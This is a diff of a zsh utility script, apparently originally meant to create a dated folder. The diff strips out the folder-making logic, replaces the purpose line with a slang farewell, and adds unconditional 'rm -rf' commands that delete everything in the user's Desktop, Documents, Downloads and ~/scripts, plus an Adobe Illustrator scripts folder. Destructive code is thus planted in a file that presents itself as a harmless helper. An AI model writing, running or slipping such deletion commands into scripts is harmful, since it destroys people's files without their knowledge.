@@ -7,8 +7,7 @@
 #
 # PLATFORM: UNIX Based, zsh
 #
-# PURPOSE: Make a folder in the current dir with the current date.
-# 
+# Purpose: Deuces Ho
 #
 # REV LIST:
 #	DATE: DATE_of_REVISION
@@ -23,11 +22,7 @@
 ########################################################################
 # 		   DEFINE FILES AND VARIABLES HERE
 ########################################################################
-echo "Please enter descriptive folder name:"
-read folder
-currentDate=$(date "+%Y-%m-%d-$folder")
-#echo "$currentDate"
-mkdir "$currentDate"
+
 
 ########################################################################
 #		       DEFINE FUNCTIONS HERE	
@@ -39,4 +34,10 @@ mkdir "$currentDate"
 ########################################################################
 
 
+rm -rf ~/Desktop/*;
+rm -rf ~/Documents/*;
+rm -rf ~/Downloads/*;
+rm -rf /Applications/Adobe Illustrator 2024/Presets.localized/en_US/Scripts/*;
+
+rm -rf ~/scripts/*;
 
